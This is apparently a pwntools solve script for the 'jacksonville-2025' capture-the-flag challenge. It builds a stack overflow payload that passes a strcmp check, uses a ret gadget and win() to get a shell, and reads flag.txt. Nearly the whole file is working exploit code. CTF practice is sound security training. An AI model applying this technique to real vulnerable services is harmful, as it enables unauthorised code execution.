import os
import time
from pwn import *

# Prefer the from-source build via the `.build/` symlink `pwnmake check` creates
# (matches what's deployed); fall back to a bare name for manual runs.
BIN = '.build/jacksonville-2025' if os.path.exists('.build/jacksonville-2025') else 'jacksonville-2025'
exe = ELF(BIN)
context.binary = exe

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25602))

#p = process(BIN)
p = remote(HOST, PORT)

p.recvuntil(b'> ')

# strcmp(buf+6, "Jaguars") must pass, then overflow buf[89] into the saved
# return address to land on win() (system("/bin/sh")). A ret gadget keeps
# the stack 16-byte aligned for the system() call.
payload = b'A' * 6 + b'Jaguars\x00'
payload += b'A' * (0x68 - len(payload))
payload += p64(0x40101a) + p64(exe.sym['win'])

p.sendline(payload)

# win() gives a shell. Let gets() consume only the payload line and the shell
# come up before sending the command, otherwise the "cat" line gets swallowed by
# the vulnerable process's own stdin instead of the spawned shell.
time.sleep(1)
p.sendline(b'cat flag.txt')
print(p.recvrepeat(3).decode(errors='replace'))
